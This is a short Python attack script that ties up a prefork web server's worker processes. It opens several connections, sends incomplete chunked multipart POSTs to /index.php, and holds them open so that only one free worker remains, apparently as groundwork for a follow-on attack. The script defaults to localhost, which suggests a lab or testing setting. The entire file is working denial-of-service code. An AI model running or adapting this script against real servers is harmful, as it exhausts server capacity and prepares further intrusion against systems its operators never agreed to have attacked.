#!/usr/bin/env python3
"""Pin prefork children with partial chunked POSTs, leaving one free.

Usage: pin_workers.py <port> [count]
Holds the connections open until killed. The server blocks each child reading
the incomplete request body, so new connections are accepted by the remaining
free child only.
"""
import socket
import sys
import time

port = int(sys.argv[1])
count = int(sys.argv[2]) if len(sys.argv) > 2 else 9
socks = []
for i in range(count):
    s = socket.create_connection(("127.0.0.1", port), timeout=10)
    s.sendall(
        b"POST /index.php HTTP/1.1\r\nHost: pin\r\n"
        b"Content-Type: multipart/form-data; boundary=C\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n1\r\nA\r\n"
    )
    socks.append(s)
print("pinned %d children on port %d" % (count, port), flush=True)
try:
    while True:
        time.sleep(60)
except KeyboardInterrupt:
    pass
